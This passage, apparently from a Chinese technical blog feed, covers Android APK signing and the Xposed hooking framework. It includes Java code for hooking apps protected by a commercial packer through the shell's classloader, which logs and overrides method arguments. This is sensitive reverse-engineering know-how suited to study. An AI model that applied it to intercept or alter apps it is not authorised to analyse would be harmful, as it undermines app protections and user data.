v2SigningEnabled <span class="hljs-literal">false</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 Android 7.0 中，会优先以 v2方案验证 APK，在Android 7.0以下版本中，系统会忽略 v2 签名，仅验证 v1 签名。Android 7.0+的校验过程如下</p><h5 id="防回滚机制"><a href="#防回滚机制" class="headerlink" title="防回滚机制"></a>防回滚机制</h5><p>因为在经过V2签名的APK中同时带有JAR签名，攻击者可能将APK的V2签名删除，使得Android系统只校验JAR签名。为防范此类攻击，V2方案规定：</p><p>V2签名的APK如果还带JAR签名，其 META-INF/<em>.SF 文件的首部中必须包含 X-Android-APK-Signed 属性。该属性的值是一组以英文逗号分隔的 APK 签名方案 ID（v2 方案的 ID 为 2）。在验证 v1 签名时，对于此组中验证程序首选的 APK 签名方案（例如，v2 方案），如果 APK 没有相应的签名，APK 验证程序必须要拒绝这些 APK。此项保护依赖于内容 META-INF/</em>.SF 文件受 v1 签名保护这一事实。</p><h5 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h5><blockquote><p>申请第三方SDK（如微信支付）时填入的SAH1值是什么？</p></blockquote><p>签名证书的指纹，在申请第三方SDK时，需填入APK包名和证书指纹，SDK开发者后台会根据这两个值生成一个key。第三方SDK在初始化时，会从系统中获取当前APK的包名、签名证书指纹以及key，然后将此指纹上传到其服务器，然后校验包名、签名证书指纹是否与此key绑定，校验通过后才进行授权。</p><blockquote><p>目前众多的快速批量打包方案又是如何绕过签名检验的？</p></blockquote><p>在V2方案出现之前，快速批量打包方案有3类：</p><ol><li><p>反编译APK后修改渠道值，再重新打包</p><p>这种方案实际上是重新签名，因有反编译、重新打包、签名的过程，速度相对后两种方案较慢；</p></li><li><p>将渠道信息以文件形式写入META-INF目录中</p><p>因为META-INF目录是用来存放签名的，其本身无法加入签名校验中，在META-INF目录中添加文件不会破坏原有签名。此方案需同时修改zip<code>数据区</code>、<code>中央目录</code>和<code>中央目录结尾记录</code>；</p></li><li><p>将渠道信息写到zip<code>中央目录结尾记录</code>的comment字段中</p><p>通过前面分析zip文件结构，可以发现<code>中央目录结尾记录</code>最后<code>注释</code>字段，这部分内容在JAR签名方案中同样不在签名校验范围中，故添加注释也不会破坏原有签名。此方案只需修改<code>中央目录结尾记录</code>；</p></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">308515</span>c94dc6<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/freekiteyu/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">84849651</span><br>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>d05e702e0507 -v1源码分析<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>证书</category>
      
    </categories>
    
    
    <tags>
      
      <tag>x509</tag>
      
      <tag>pkcs</tag>
      
      <tag>android签名</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xposed框架</title>
    <link href="/2021/08/22/xposed%E6%A1%86%E6%9E%B6/"/>
    <url>/2021/08/22/xposed%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h2><p>hook是Windows中提供的一种用以替换DOS下“中断”的系统机制。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。这时钩子函数即可以加工处理（改变）该消息，也可以不作处理而继续传递该消息，还可以强制结束消息的传递。</p><p><strong>Xposed框架核心思想:在于将java层普通函数注册成本地JNI方法，以此来变相实现HOOk机制。</strong></p><h3 id="1-1-核心思想"><a href="#1-1-核心思想" class="headerlink" title="1.1 核心思想"></a>1.1 核心思想</h3><p>一、Xposed框架的核心原理</p><p>修改/system/bin/app-process程序。在android执行第一个程序zygote进程之前进行截获，改变执行流程，进入到自身的Main函数体内。Main函数执行体内主要完成以下四步流程：</p><ol><li>initNative(). 为了方便Xposed框架的native方法对上层Java方法的调用，在该部分对相关native方法进行初始化工作。</li><li>initXbrigdeZygote().主要hook几个涉及到应用进程创建，启动的关键类。</li><li>loadModules,读取系统中放置的hook模块，然后把该模块的路径写进conf/moudules.list中。</li><li>Xposed框架加载完毕后，将执行权还给第一个程序zygote,完成正常的系统启动流程。<br>（XPOSED的安装器替换安卓系统的app_process文件，从而实现对系统的接管，通过回调模块的方式来达到不用修改APK就能改变其表现行为的目的。该框架比较成熟，对应的模块也非常多，常用的还有模拟地理位置，伪装手机设备信息等，脑洞是非常之大，基本上能想到的都能做到。）</li></ol><p>app_process其实是一个程序，存放在systen/bin目录下的，作用就是启动一个程序，启动zygote进程，所有App启动。app_process只要找到需要运行程序的main函数，也就是入口函数，然后执行，他不仅能执行C/C++程序，也可以执行Java程序。</p><p>在Android中，zygote是整个系统创建新进程的核心进程。</p><p>Android系统是基于Linux内核的，而在Linux系统中，所有的进程都是Zygoteinit进程的子孙进程，也就是说，所有的进程都是直接或者间接地由Zygoteinit进程fork出来的。</p><p>由于Xposed框架Hook了Android的核心进程Zygote，而其他应用启动都是从Zygote进程fork而来，就够达到针对系统上所有的应用程序进程的Hook。</p><h3 id="1-2-Xposed内部执行流程"><a href="#1-2-Xposed内部执行流程" class="headerlink" title="1.2 Xposed内部执行流程"></a>1.2 Xposed内部执行流程</h3><ul><li><p>创建新应用，获取包名等信息。</p></li><li><p>调用XC_LoadPackage.callAll，依次执行各hook模块的代码。</p></li><li><p>如果有包名匹配的hook模块，则注册模块中要hook的方法为本地方法。</p></li><li><p>当该方被调用的时候，转移到本地xposedCallHandler。</p></li><li><p>xposedCallHandler回调上层handlerHookedMethod(因为加载的hook模块代码，一些变量都存储在java层)。</p></li><li><p>handlerHookedMethod执行加载的各hook模块</p></li></ul><p>beforeHookedMethod 该方法在hook目标方法执行前调用，其中，参数param指的是目标方法的相关参数、回调、方法等信息</p><p>afterHookedMethod该方法在hook目标方法执行后调用，其中，参数param指的是目标方法的相关参数、回调、方法等信息。</p><p>Xposed运行多个模块对同一个方法进行hook时，框架就会根据Xposed模块的优先级来排序，在具有a.before、a.after、b.before、b.after的情    况下，运行的先后顺序如下：（a优先级高于b）</p><p>before -&gt; b.before -&gt;originalMethod -&gt; b.after -&gt; a.after</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">1、如何Hook静态变量<br>2、如何Hook构造方法<br>3、如何Hook复杂参数的方法<br>4、如何替换函数执行内容<br>5、如何Hook内部类中的函数<br>6、如何Hook匿名类的函数<br>7、如何获取调用对象去调用函数，或者新建新建示例去调用方法<br></code></pre></td></tr></table></figure><p> 学会这些方法，在结合逆向smail的一些知识，应该可以满足大多数java层的hook了。</p><h2 id="2-API"><a href="#2-API" class="headerlink" title="2. API"></a>2. API</h2><ol><li><p>IXposedHookLoadPackage</p><p>方法: handleLoadPackage,这个方法用于在加载应用程序的包的时候执行用户的操作</p><p>参数说明: final LoadPackageParam lpparam 这个参数包含了加载的应用程序的一些基本信息.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">方法: findAndHookMethod,这是一个辅助方法，可以通过静态导入使用<br><br>参数说明: findAndHookMethod(Class&lt;?&gt; clazz,  ClassLoader，  methodName, Object…，  parameterTypesAndCallback )<br><br><br>Class&lt;?&gt; clazz, <span class="hljs-comment">//需要 Hook 的类名;</span><br><br>ClassLoader，<span class="hljs-comment">//类加载器，可以设置为 null String;</span><br><br>methodName, <span class="hljs-comment">//需要 Hook 的方法名;</span><br><br>Object…，<span class="hljs-comment">//对象类型;  </span><br><br>parameterTypesAndCallback <span class="hljs-comment">//回调方法</span><br></code></pre></td></tr></table></figure></li><li><p>XposedBridge</p><p>方法: log（）,打日志。</p><p>该方法可以将 log 信息以及 Throwable 抛出的异常信息输出到标准的logcat 以及/data/xposed/debug.log 这个文件中 </p><p>无参方法: hookAllMethods/hookAllConstructors，该方法可以用来 hook 某个类中的所有方法或者构造函数，但是不同的Rom（非Android原生 Rom）会有不同的变种。</p></li><li><p>XC_LoadPackage.LoadPackageParam</p><table><thead><tr><th>fields</th><th>type</th><th>description</th></tr></thead><tbody><tr><td>packageName</td><td>String</td><td>应用包名</td></tr><tr><td>processName</td><td>String</td><td>应用加载后的进程名</td></tr><tr><td>classLoader</td><td>ClassLoader</td><td>应用的classloader</td></tr><tr><td>appInfo</td><td>ApplicationInfo</td><td>应用的信息，包括verisonCode，uid等</td></tr></tbody></table></li></ol><ol start="5"><li><p>IXposedHookInitPackageResources</p><p>XposedHookInitPackageResources的resparam参数有以下两个字段</p><table><thead><tr><th>field</th><th>type</th><th>description</th></tr></thead><tbody><tr><td>packageName</td><td>String</td><td>应用包名</td></tr><tr><td>res</td><td>XResources</td><td>资源相关</td></tr></tbody></table></li></ol><ol start="6"><li><p>XposedHelpers</p><ul><li><p>查找类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//className  完整类名，classLoader 类加载器（app应用的类加载器）</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; findClass(String className, ClassLoader classLoader)<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; findClassIfExists(String className, ClassLoader classLoader)<br></code></pre></td></tr></table></figure></li><li><p>查找字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// clazz 通过findClass获取,调用findFieldRecursiveImpl获取</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">findFieldRecursiveImpl</span><span class="hljs-params">(Class&lt;?&gt; clazz, String fieldName)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> clazz.getDeclaredField(fieldName);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>                clazz = clazz.getSuperclass();<br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">null</span> || clazz.equals(Object.class))<br>                    <span class="hljs-keyword">break</span>;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-keyword">return</span> clazz.getDeclaredField(fieldName);<br>                &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ignored) &#123;&#125;<br>            &#125;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">findFirstFieldByExactType</span><span class="hljs-params">(Class&lt;?&gt; clazz, Class&lt;?&gt; type)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">//获取实例字段的引用</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">getObjectField</span><span class="hljs-params">(Object obj, String fieldName)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-comment">/*获取Field的方法，具体实现是在findFieldRecursiveImpl方法里面获取，外部不能访问，Field是通过getDeclaredField获取，所以只能获取static类型的字段。indFirstFieldByExactType()方法是匹配Field的classType,如果类型一样，则返回该字段，该方法的局限性是只能获取到第一个匹配到的字段，后面相同类型的无法获取*/</span></span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure></li><li><p>设置字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setXXXField</span><span class="hljs-params">(Object obj, String fieldName, XXX value)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setStaticXXXField</span><span class="hljs-params">(Class&lt;?&gt; clazz, String fieldName, XXX value)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Xxx <span class="hljs-title">getXxxField</span><span class="hljs-params">(Object obj, String fieldName)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Xxx <span class="hljs-title">getStaticXxxField</span><span class="hljs-params">(Class&lt;?&gt; clazzj, String fieldName)</span></span><br></code></pre></td></tr></table></figure></li><li><p>查找方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Method <span class="hljs-title">findMethodExact</span><span class="hljs-params">(Class&lt;?&gt; clazz, String methodName, Object... parameterTypes)</span> </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Method <span class="hljs-title">findMethodExactIfExists</span><span class="hljs-params">(Class&lt;?&gt; clazz, String methodName, Object... parameterTypes)</span></span><br></code></pre></td></tr></table></figure></li><li><p>调用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">callMethod</span><span class="hljs-params">(Object obj, String methodName, Object... args)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">callMethod</span><span class="hljs-params">(Object obj, String methodName, Class&lt;?&gt;[] parameterTypes, Object... args)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">callStaticMethod</span><span class="hljs-params">(Class&lt;?&gt; clazz, String methodName, Object... args)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">callStaticMethod</span><span class="hljs-params">(Class&lt;?&gt; clazz, String methodName, Class&lt;?&gt;[] parameterTypes, Object... args)</span></span><br></code></pre></td></tr></table></figure></li><li><p>调用实例/静态Method，返回值为方法返回值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> XC_MethodHook.<span class="hljs-function">Unhook <span class="hljs-title">findAndHookMethod</span><span class="hljs-params">(Class&lt;?&gt; clazz, String methodName, Object... parameterTypesAndCallback)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">//通过className和classLoader获取Class&lt;?&gt; ，再调用上面的方法</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> XC_MethodHook.Unhook <span class="hljs-title">findAndHookMethod</span><span class="hljs-params">(String className, ClassLoader classLoader, String methodName, Object... parameterTypesAndCallback)</span></span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>Hook方法的一个方法，其中parameterTypesAndCallback和findConstructorExact方法的parameterTypes类似，不过这里可变数组最后一个对象必须为XC_MethodHook对象或者其子类，前面的对象为参数的ClassType或者类字符串，在hook成功后，当调用hook的方法时，会在XC_MethodHook回调。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XC_MethodHook</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">XCallback</span> </span>&#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                <span class="hljs-comment">//方法调用前的回调</span><br>                <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                <span class="hljs-comment">//方法调用后的回调</span><br>                <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>            &#125;<br>        &#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XC_MethodReplacement</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">XC_MethodHook</span></span>&#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">replaceHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                <span class="hljs-comment">//带返回值的方法执行时调用</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>            &#125;<br>        &#125;<br>    <br></code></pre></td></tr></table></figure></li><li><p>hook构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Constructor&lt;?&gt; findConstructorExact(Class&lt;?&gt; clazz, Object... parameterTypes)<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Constructor&lt;?&gt; findConstructorExactIfExists(Class&lt;?&gt; clazz, Object... parameterTypes) <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Constructor&lt;?&gt; findConstructorBestMatch(Class&lt;?&gt; clazz, Class&lt;?&gt;... parameterTypes)<br>  <br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*获取Constructor方法，其中Object... parameterTypes 是一个Object的可变数组，parameterTypes由Class&lt;?&gt;的可变数组 ，完整类名字符串和XC_MethodHook抽象类 组成。XC_MethodHook为可选参数，并且总在最后一个。XC_MethodHook在这里并无实际意义，Class&lt;?&gt;[] 为相应的构造函数的类型，通过一个例子简单说明，有一个T类，构造函数有三个参数，可以用以下几种方式获取：*/</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span> </span>&#123;<br>    String str;<br>    Context mContext;<br>    View mView;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">T</span><span class="hljs-params">(String str, Context context, View view)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.str = str;<br>        mContext = context;<br>        mView = view;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//方式1：</span><br>Constructor constructor = XposedHelpers.findConstructorExact(clazz, String.class, Context.class, View.class);<br><br><span class="hljs-comment">//方式2：</span><br>Constructor constructor = XposedHelpers.findConstructorExact(T.class, String.class, <span class="hljs-string">&quot;android.content.Context&quot;</span>, View.class);<br><br><span class="hljs-comment">//方式3：（XC_MethodHook无实际意义）</span><br>Constructor constructor = XposedHelpers.findConstructorExact(T.class, String.class, <span class="hljs-string">&quot;android.content.Context&quot;</span>, View.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;&#125;);<br></code></pre></td></tr></table></figure></li></ul></li></ol><h2 id="3-Hook加固APP"><a href="#3-Hook加固APP" class="headerlink" title="3. Hook加固APP"></a>3. Hook加固APP</h2><p>一.hook原理</p><p>使用加固之后的应用的classloader会被换成其加固应用本身的，所以只需要在hook的时候把classloader换成壳的就可以了。</p><p>二.具体操作和分析</p><p>被加固的应用是可以反编译的，反编译之后dex里面只有很少的几个类，比较重要的就是壳入口这个类，可以在这个类里面的里面去获取context参数，然后就可以通过context获得到壳的类加载器，之后只需要用这个类加载器来hook就可以成功的hook到加固的app</p><p>注：</p><p>Android源码中<a href="http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/app/Application.java#188">android.app.Applocation 188行</a>,attachBaseContext方法在Application的attach方法被调用，基本上所有的壳都会在attachBaseContext里完成代码解密并且内存加载dex，所以在<br>attachBaseContext执行之后，拿到的classloader就已经加载过加固dex的classloader。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">               XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;com.tencent.StubShell.TxAppEntry&quot;</span>, loadPackageParam.classLoader,<br>                    <span class="hljs-string">&quot;attachBaseContext&quot;</span>, Context.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                            <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>                            <span class="hljs-comment">//获取到Context对象，通过这个对象来获取classloader</span><br>                            Context context = (Context) param.args[<span class="hljs-number">0</span>];<br>                            <span class="hljs-comment">//获取classloader，之后hook加固后的就使用这个classloader</span><br>                            ClassLoader classLoader =context.getClassLoader();<br>                            <span class="hljs-comment">//下面就是强classloader修改成壳的classloader就可以成功的hook了</span><br>                            XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;xxx.xxx.xxx.xxx&quot;</span>, classLoader, <span class="hljs-string">&quot;xxx&quot;</span>, String.class, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                                <span class="hljs-meta">@Override</span><br>                                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                                    <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>                                    LogUtils.log( <span class="hljs-string">&quot;key： &quot;</span> + (String) param.args[<span class="hljs-number">0</span>]);<br>                                    LogUtils.log( <span class="hljs-string">&quot;value： &quot;</span> + (String) param.args[<span class="hljs-number">1</span>]);<br>                                    param.setResult((String) param.args[<span class="hljs-number">1</span>]);<br>                                &#125;<br>                            &#125;);<br>                       <br>        &#125;<br> <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-获取所有类"><a href="#3-获取所有类" class="headerlink" title="3. 获取所有类"></a>3. 获取所有类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresApi(api = Build.VERSION_CODES.KITKAT)</span><br><span class="hljs-keyword">public</span> String[] getClass(ClassLoader classLoader)&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> j;<br>    <span class="hljs-keyword">int</span> k;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">//取得PathClassLoader的pathList的属性</span><br>        Field pathList = classLoader.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;pathList&quot;</span>);<br>        pathList.setAccessible(<span class="hljs-keyword">true</span>);<br>      <span class="hljs-comment">// 取得PathClassLoader的pathList的属性真实值（得到一个DexPathList对象）</span><br>        Object dexPathListObj=pathList.get(classLoader);<br>      <span class="hljs-comment">//获得DexPathList中的dexElements 属性</span><br>        Field dexElementsField =         dexPathListObj.getClass().getDeclaredField(<span class="hljs-string">&quot;dexElements&quot;</span>);<br>        dexElementsField.setAccessible(<span class="hljs-keyword">true</span>);<br>      <span class="hljs-comment">// 获得DexPathList对象中dexElements 属性的真实值</span><br>        Object dexElements_objs=dexElementsField.get(dexPathListObj);<br><br>            <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;Array.getLength(dexElements_objs);i++)&#123;<br>                Object dexElements_obj=Array.get(dexElements_objs,i);<br>   Field dexfileField =dexElements_obj.getClass().getDeclaredField(<span class="hljs-string">&quot;dexFile&quot;</span>);<br>                dexfileField.setAccessible(<span class="hljs-keyword">true</span>);<br>                Object clz=dexfileField.get(dexElements_obj);<br>                Method[] methods=clz.getClass().getDeclaredMethods();<br>                <span class="hljs-keyword">for</span> (j=<span class="hljs-number">0</span>;j&lt;methods.length;j++)&#123;<br>                    Method method=methods[j];<br>                    <span class="hljs-keyword">if</span> (method.getName().equalsIgnoreCase(<span class="hljs-string">&quot;getClassNameList&quot;</span>))&#123;<br>                        method.setAccessible(<span class="hljs-keyword">true</span>);<br>                        Field mCookieField = clz.getClass().getDeclaredField(<span class="hljs-string">&quot;mCookie&quot;</span>);<br>                        mCookieField.setAccessible(<span class="hljs-keyword">true</span>);<br>                        Object classoes_bj=method.invoke(clz,mCookieField.get(clz));<br>                        <span class="hljs-keyword">int</span> classes_len=Array.getLength(classoes_bj);<br>                        String[] classes=<span class="hljs-keyword">new</span> String[classes_len];<br>                        <span class="hljs-keyword">for</span> (k=<span class="hljs-number">0</span>;k&lt;classes_len;k++)&#123;<br>                            classes[k]= (String) Array.get(classoes_bj,k);<br>                        &#125;<br>                       <span class="hljs-keyword">return</span> 